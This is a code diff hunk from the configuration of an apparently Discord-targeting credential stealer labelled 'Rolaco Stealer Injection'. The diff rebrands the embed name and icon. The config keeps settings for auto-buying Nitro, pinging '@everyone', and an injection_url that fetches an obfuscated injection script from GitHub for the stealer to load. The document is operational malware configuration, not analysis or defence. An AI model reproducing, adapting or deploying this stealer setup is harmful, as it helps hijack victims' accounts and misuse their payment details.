@@ -12,8 +12,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'ROlaco Stealer Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png',
+  embed_name: 'Rolaco Stealer Injection', 
+  embed_icon: 'https://raw.githubusercontent.com/Rolaco0/Rolacoim/main/mascot.png',
   embed_color: 5639644, 
   injection_url: 'https://raw.githubusercontent.com/Rolaco0/Discord-Injection-RG/main/injection-obfuscated.js', 
 
